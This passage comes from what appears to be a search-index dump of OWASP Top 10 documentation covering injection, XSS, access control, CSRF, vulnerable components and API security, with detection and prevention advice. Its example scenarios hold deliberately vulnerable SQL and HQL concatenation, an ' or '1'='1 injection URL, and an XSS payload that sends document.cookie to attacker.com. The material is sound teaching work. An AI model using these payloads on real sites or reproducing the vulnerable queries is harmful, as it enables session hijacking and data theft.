testing.\n\n\n\nDifference between Software Security and Application Security\nGary McGraw\n\nGary McGraw maintains that application security is a reactive approach, taking place once software has been deployed.

Almost any source of data can be an injection vector, including internal sources. Injection Flaws occur when an application sends untrusted data to an interpreter. Injection flaws are very prevalent, particularly in legacy code.  They are often found in SQL, LDAP, XPath, or NoSQL queries; OS commands; XML parsers, SMTP Headers, expression languages, etc. Injection flaws are easy to discover when examining code, but frequently hard to discover via testing. Scanners and fuzzers can help attackers find injection flaws. Injection can result in data loss or corruption, lack of accountability, or denial of access. Injection can sometimes lead to complete host takeover.Consider the business value of the affected data and the platform running the interpreter. All data could be stolen, modified, or deleted.  Could your reputation be harmed?\n\n\n\nDetecting Vulnerability\n\nThe best way to find out if an application is vulnerable to injection is to verify that all use of interpreters clearly separates untrusted data from the command or query.\nIn many cases, it is recommended to avoid the interpreter, or disable it (e.g., XXE), if possible.\nFor SQL calls, use bind variables in all prepared statements and stored procedures, or avoid dynamic queries.\nChecking the code is a fast and accurate way to see if the application uses interpreters safely.\nCode analysis tools can help a security analyst find use of interpreters and trace data flow through the application.\nPenetration testers can validate these issues by crafting exploits that confirm the vulnerability.\nAutomated dynamic scanning which exercises the application may provide insight into whether some exploitable injection flaws exist.\nScanners cannot always reach interpreters and have difficulty detecting whether an attack was successful.\nPoor error handling makes injection flaws easier to discover.\n\nPreventing Vulnerability\nKeep untrusted data separate from commands and queries.\n\nThe preferred option is to use a safe API which avoids the use of the interpreter (Specific Language Interpreter I presume) entirely or provides a parameterized interface.\nBe careful with APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood.\n\n\nIf a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter.\nPositive or \"white list\" input validation is also recommended, but is not a complete defense as many situations require special characters be allowed. Recommend to resort to step 1 and 2 in this case\n\nExample Attack Scenarios\n\nAn application uses untrusted data in the construction of the following vulnerable SQL call:\n\nString query = \"SELECT * FROM accounts WHERE custID = '\" + request.getParameter(\"id\") + \"'\";\n\nSimilarly, an application’s blind trust in frameworks may result in queries that are still vulnerable\n\nQuery HQLQuery = session.createQuery(\"FROM accounts WHERE custID='\" + request.getParameter(\"id\") + \"'\");\nIn both cases, the attacker modifies the 'id' parameter value in her browser to send:  ' or '1'='1.\nhttp://example.com/app/accountView?id='or '1'='1\nThis changes the meaning of both queries to return all the records from the accounts table.\nMore dangerous attacks could modify data or even invoke stored procedures.\nInjection Demo\nInjection Demo\nReferences\nSQL Injection Cheat Sheet\nQuery Parameterization Cheat Sheet\nCommand Injection\nTesting for SQL Injection)\n"},"docs/broken-authentication-and-session-management.html":{"url":"docs/broken-authentication-and-session-management.html","title":"Broken Authentication and Session Management","keywords":"","body":"Broken Authentication and Session Management\n\nApplication functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities (temporarily or permanently)\n\nCreated with Raphaël 2.1.4Threat AgentsAttack VectorsSecurity WeaknessesTechnical ImpactsBusiness Impacts\n\n\n\nThreat Agents Attack VectorsSecurity WeaknessTechnical ImpactsBusiness Impacts\n\n\n\n\nApplication Specific\nExploitability => Easy\nPrevalence => Common\nDetectability => Average\nImpact => Severe\nApp/Business Specific\n\n\nConsider anonymous external attackers, as well as authorized users, who may attempt to steal accounts from others.

Almost any source of data can be an attack vector, including internal sources such as data from the database. XSS flaws occur when an application updates a webpage with attacker controlled data without properly escapingthat content or using a safe JavaScript API. There are two primary categories of XSS flaws: (1) Stored, and (2) Reflected, and each of these can occur on (a) the Serveror (b) on the Client. Detection of most Server XSSflaws is fairly easy via testing or code analysis. Client XSScan be very difficult to identify. Attackers can execute scripts in a victim’s browser to hijack user sessions, deface web sites, insert hostile content, redirect users, hijack the user’s browser using malware, etc.Consider the business value of the affected system and all the data it processes.Also consider the business impact of public exposure of the vulnerability.\n\n\n\nDetecting Vulnerability\n\nYou are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output\nAnd not using context-sensitive escaping to ensure it cannot run.\nIf a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS.\nIdeally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.\nAutomated tools can find some XSS problems automatically.\nEach application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, usually using 3rd party libraries built on top of these technologies.\nThis diversity makes automated detection difficult, particularly when using modern single-page applications and powerful JavaScript frameworks and libraries.\nTherefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches.\n\nPreventing Vulnerability\nPreventing XSS requires separation of untrusted data from active browser content.\n\nTo avoid Server XSS, the preferred option is to properly escape untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into.\nTo avoid Client XSS, the preferred option is to avoid passing untrusted data to JavaScript and other browser APIs that can generate active content. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP DOM based XSS Prevention Cheat Sheet.\nFor rich content, consider auto-sanitization libraries like OWASP’s AntiSamy or the Java HTML Sanitizer Project.\nConsider Content Security Policy (CSP) to defend against XSS across your entire site.\n\nExample Attack Scenarios\n\nThe application uses untrusted data in the construction of the following HTML snippet without validation or escaping:\n  (String) page += \"\";\n  The attacker modifies the ‘CC’ parameter in his browser to:\n  '>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie'.\n  This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

Are users restricted to certain functions and data?

Is access to this functionality or data granted? For data, applications and APIsfrequentlyuse the actual name or key of an object when generating web pages. For functions, URLs and function names are frequently easy to guess. Applications and APIs don’t always verify the user is authorized for the target resource. This results in an access control flaw. Testers can easily manipulate parameters to detect such flaws. Code analysis quickly shows whether authorization is correct. Such flaws can compromise all the functionality or data that is accessible. Unless references are unpredictable,or access control is enforced, data and functionality can be stolen, or abused.Consider the business value of the exposed data and functionality. Also consider the business impact of public exposure of the vulnerability.\n\n\n\nDetecting Vulnerability\nThe best way to find out if an application is vulnerable to access control vulnerabilities is to verify that all data and function references have appropriate defenses.\nTo determine if you are vulnerable, consider:\n\nFor data references, does the application ensure the user is authorized by using a reference map or access control check to ensure the user is authorized for that data?\nFor non-public function requests, does the application ensure the user is authenticated, and has the required roles or privileges to use that function?\n\nCode review of the application can verify whether these controls are implemented correctly and are present everywhere they are required.\n\nManual testing is also effective for identifying access control flaws.\nAutomated tools typically do not look for such flaws because they cannot recognize what requires protection or what is safe or unsafe.\n\nPreventing Vulnerability\nPreventing access control flaws requires selecting an approach for protecting each function and each type of data (e.g., object number, filename).\n\nCheck access. Each use of a direct reference from an untrusted source must include an access control check to ensure the user is authorized for the requested resource.\nUse per user or session indirect object references.\nThis coding pattern prevents attackers from directly targeting unauthorized resources.\nFor example, instead of using the resource’s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected.\nOWASP’s ESAPI includes both sequential and random access reference maps that developers can use to eliminate direct object references.\n\n\nAutomated verification. Leverage automation to verify proper authorization deployment.\nThis is often custom.\n\n\n\nExample Attack Scenarios\n\nThe application uses unverified data in a SQL call that is accessing account information:\n pstmt.setString( 1, request.getParameter(\"acct\"));ResultSet results = pstmt.executeQuery( );\n An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want.\n If not properly verified, the attacker can access any user’s account.\n http://example.com/app/accountInfo?acct=notmyacct`\n\nAn attacker simply force browses to target URLs.\n\nAdmin rights are also required for access to the admin page.\nhttp://example.com/app/getappInfo\nhttp://example.com/app/admin_getappInfo\nIf an unauthenticated user can access either page, it’s a flaw.\nIf a non-admin can access the admin page, this is also a flaw\n\n\n\n\nReferences\nIndirect Object References\nFunction Level Access Control\n"},"docs/security-misconfiguration.html":{"url":"docs/security-misconfiguration.html","title":"Security Misconfiguration","keywords":"","body":"Security Misconfiguration\n\nGood security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, platform, etc. Secure settings should be defined, implemented, and maintained, as defaults are often insecure.

If the user is authenticated, the attack succeeds. CSRF takes advantage of the fact that most web apps allow attackers to predict all the details of a particular action.Because browsers send credentials like session cookies automatically, attackers can create malicious web pages which generate forged requests that are indistinguishable from legitimate ones.Detection of CSRF flaws is fairly easy via penetration testing or code analysis. Attackers can trick victims into performing any state changing operation the victim is authorized to perform(e.g., updating account details, making purchases, modifying data).Consider the business value of the affected data or application functions. Imagine not being sure if users intended to take these actions.Consider the impact to your reputation.\n\n\n\nDetecting Vulnerability\n\nTo check whether an application is vulnerable, see if any links and forms lack an unpredictable CSRF token.\nWithout such a token, attackers can forge malicious requests.\nAn alternate defense is to require the user to prove they intended to submit the request, such as through reauthentication.\n\n\nFocus on the links and forms that invoke state-changing functions, since those are the most important CSRF targets.\nMultistep transactions are not inherently immune.\nAlso be aware that Server-Side Request Forgery (SSRF) is also possible by tricking apps and APIs into generating arbitrary HTTP requests.\n\n\nNote that session cookies, source IP addresses, and other information automatically sent by the browser don’t defend against CSRF since they are included in the forged requests.\nOWASP’s CSRF Tester tool can help generate test cases to demonstrate the dangers of CSRF flaws.\n\nPreventing Vulnerability\n\nThe preferred option is to use an existing CSRF defense.\nMany frameworks now include built in CSRF defenses, such as Spring, Play, Django, and AngularJS.\nSome web development languages, such as .NET do so as well.\nOWASP's CSRF Guard can automatically add CSRF defenses to Java apps.\nOWASP's CSRF Protector does the same for PHP or as an Apache filter.\n\n\nOtherwise, preventing CSRF usually requires the inclusion of an unpredictable token in each HTTP request.\nSuch tokens should, at a minimum, be unique per user session.\nThe preferred option is to include the unique token in a hidden field.\nThis includes the value in the body of the HTTP request, avoiding its exposure in the URL\nThe unique token can also be included in the URL or a parameter.\nHowever, this runs the risk that the token will be exposed to an attacker.\nConsider using the \"SameSite=strict\" flag on all cookies, which is increasingly supported in browsers.\n\n\n\nExample Attack Scenarios\n\nThe application allows a user to submit a state changing request that does not include anything secret.\n\nFor example:http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account,\nthen embeds this attack in an image request or iframe stored on various sites under the attacker's control:\n\n\n\n\nIf the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request\n\n\nReferences\nCSRF)\nCSRF Prevention Cheat Sheet_Prevention_Cheat_Sheet)\n"},"docs/using-components-with-known-vulnerabilities.html":{"url":"docs/using-components-with-known-vulnerabilities.html","title":"Using Components with Known Vulnerabilities","keywords":"","body":"Using Components with Known Vulnerabilities\n\nComponents, such as libraries, frameworks, and other software modules, run with the same privileges as the application.

They customize the exploit as needed and execute the attack. It gets more difficult if the used component is deep in the application. Many applications and APIs have these issues because their development teams don’t focus on ensuring their components and libraries are up to date. In some cases, the developers don’t even know all the components they are using, never mind their versions. Component dependencies make things even worse. Tools are becoming commonly available to help detect components with known vulnerabilities. The full range of weaknesses is possible, including injection, broken access control, XSS, etc. The impact could range from minimalto complete host takeover and data compromise.Consider what each vulnerability might mean for the business controlled by the affected application. It could be trivial or it could mean complete compromise.\n\n\n\nDetecting Vulnerability\n\nThe challenge is to continuously monitor the components (both client-side and server-side) you are using for new vulnerability reports.\nThis monitoring can be very difficult because vulnerability reports are not standardized\nmaking them hard to find and search for the details you need\n(e.g., the exact component in a product family that has the vulnerability.\nWorst of all, many vulnerabilities never get reported to central clearinghouses like CVE and NVD.\nNode.js has Snyk\n\n\nDetermining if you are vulnerable requires searching these databases, as well as keeping abreast of project mailing lists and announcements for anything that might be a vulnerability.\nThis process can be done manually, or with automated tools.\nIf a vulnerability in a component is discovered, carefully evaluate whether you are actually vulnerable.\nCheck to see if your code uses the vulnerable part of the component and whether the flaw could result in an impact you care about.\nBoth checks can be difficult to perform as vulnerability reports can be deliberately vague.\n\n\n\nPreventing Vulnerability\n\nMost component projects do not create vulnerability patches for old versions.\nSo the only way to fix the problem is to upgrade to the next version, which can require other code changes.\nSoftware projects should have a process in place to:\nContinuously inventory the versions of both client-side and server-side components and their dependencies using tools like versions, DependencyCheck, retire.js, etc.\nContinuously monitor sources like NVD for vulnerabilities in your components.\nUse software composition analysis tools to automate the process.\n\n\nAnalyze libraries to be sure they are actually invoked at runtime before making changes, as the majority of components are never loaded or invoked.\nDecide whether to upgrade component (and rewrite application to match if needed) or deploy a virtual patch that analyzes HTTP traffic, data flow, or code execution and prevents vulnerabilities from being exploited\n\n\n\nExample Attack Scenarios\n\nComponents almost always run with the full privilege of the application, so flaws in any component can result in serious impact.\nSuch flaws can be accidental (e.g., coding error) or intentional (e.g., backdoor in component).\nSome example exploitable component vulnerabilities discovered are:\nApache CXF Authentication Bypass\nBy failing to provide an identity token, attackers could invoke any web service with full permission.\n(Apache CXF is a services framework, not to be confused with the Apache Application Server.)\nStruts 2 Remote Code Execution\nSending an attack in the Content-Type header causes the content of that header to be evaluated as an OGNL expression, which enables execution of arbitrary code on the server.\n\n\nApplications using a vulnerable version of either component are susceptible to attack as both components are directly accessible by application users.\nOther vulnerable libraries, used deeper in an application, may be harder to exploit.\n\n\n\nReferences\nOWASP Dependency Check\nVirtual Patching Best Practices\n"},"docs/underprotected-apis.html":{"url":"docs/underprotected-apis.html","title":"Underprotected APIs","keywords":"","body":"Underprotected Apis\n\nModern applications often involve rich client applications and APIs, such as JavaScript in the browser and mobile apps, that connect to an API of some kind (SOAP/XML, REST/JSON, RPC, GWT, etc.). These APIs are often unprotected and contain numerous vulnerabilities.\n\nCreated with Raphaël 2.1.4Threat AgentsAttack VectorsSecurity WeaknessesTechnical ImpactsBusiness Impacts\n\n\n\nThreat Agents Attack VectorsSecurity WeaknessTechnical ImpactsBusiness Impacts\n\n\n\n\nApplication Specific\nExploitability => Easy\nPrevalence => Common\nDetectability => Average\nImpact => Severe\nApp/Business Specific\n\n\nConsider anyone with the ability to send requests to your APIs. Client software is easily reversed and communications are easily intercepted, so obscurity is no defense for APIs.\nAttackers can reverse engineer APIs by examining client code, or simply monitoring communications. Some API vulnerabilities can be automatically discovered, others only by experts. Modern web applications and APIs are increasingly composed of rich clients (browser, mobile, desktop) that connect to backend APIs (XML, JSON, RPC, GWT, custom). APIs (microservices, services, endpoints) can be vulnerable to the full range of attacks. Unfortunately, dynamic and sometimes even static tools don’t work well on APIs, and they can be difficult to analyze manually, so these vulnerabilities are often undiscovered. The full range of negative outcomes is possible, including data theft, corruption, and destruction; unauthorized access to the entire application; and complete host takeover.Consider the impact of an API attack on the business. Does the API access critical data or functions? Many APIs are mission critical, so also consider the impact of denial of service attacks.\n\n\n\nDetecting Vulnerability\n\nTesting your APIs for vulnerabilities should be similar to testing the rest of your application for vulnerabilities.\nAll the different types of injection, authentication, access control, encryption, configuration, and other issues can exist in APIs just as in a traditional application.\n\n\nHowever, because APIs are designed for use by programs (not humans) they frequently lack a UI and also use complex protocols and complex data structures.\nThese factors can make security testing difficult.\nThe use of widely-used formats can help, such as Swagger (OpenAPI), REST, JSON, and XML.\nSome frameworks like GWT and some RPC implementations use custom formats.\nSome applications and APIs create their own protocol and data formats, like WebSockets.\nThe breadth and complexity of APIs make it difficult to automate effective security testing, possibly leading to a false sense of security.\n\n\nUltimately, knowing if your APIs are secure means carefully choosing a strategy to test all defenses that matter.\n\nPreventing Vulnerability\n\nThe key to protecting APIs is to ensure that you fully understand the threat model and what defenses you have\nEnsure that you have secured communications between the client and your APIs.\nEnsure that you have a strong authentication scheme for your APIs, and that all credentials, keys, and tokens have been secured.\nEnsure that whatever data format your requests use, that the parser configuration is hardened against attack.\nImplement an access control scheme that protects APIs from being improperly invoked, including unauthorized function and data references.\nProtect against injection of all forms, as these attacks are just as viable through APIs as they are for normal apps.\nBe sure your security analysis and testing covers all your APIs and your tools can discover and analyze them all effectively.\n\n\n\nExample Attack Scenarios\n\nImagine a mobile banking app that connects to an XML API at the bank for account information and performing transactions.\nThe attacker reverse engineers the app and discovers that the user account number is passed as part of the authentication request to the server along with the username and password.\nThe attacker sends legitimate credentials, but another user’s account number, gaining full access to the other user’s account.\n\n\nImagine a public API offered by an Internet startup for automatically sending text messages.\nThe API accepts JSON messages that contain a \"transactionid\" field.\nThe API parses out this \"transactionid\" value as a string and concatenates it into a SQL query, without escaping or parameterizing it.\nAs you can see the API is just as susceptible to SQL injection as any other type of application.\nIn either of these cases, the vendor may not provide a web UI to use these services, making security testing more difficult.\n\n\n\nReferences\nRest Security Cheat Sheet\nWeb Service Security Cheat Sheet\n"},"docs/application_demo.html":{"url":"docs/application_demo.html","title":"Application Demo","keywords":"","body":"OWASP Top 10 Demo Application Check List\nTODO LIST:\n\nInjection\nBroken Authentication and Session Management\nCross-Site Scripting\nBroken Access Control\nSecurity Misconfiguration\nSensitive Data Exposure\nInsufficient Attack Protection\nCross-Site Request Forgery\nUsing Components with Known Vulnerabilities\nUnderprotected APIs\n\nInjection\nMore to follow\nBroken Authentication and Session Management\nMore to follow\nCross-Site Scripting\nMore to follow\nBroken Access Control\nMore to follow\nSecurity Misconfiguration\nMore to follow\nSensitive Data Exposure\nMore to follow\nInsufficient Attack Protection\nMore to follow\nCross-Site Request Forgery\nMore to follow\nUsing Components with Known Vulnerabilities\nMore to follow\nUnderprotected APIs\nMore to follow\n"}}}
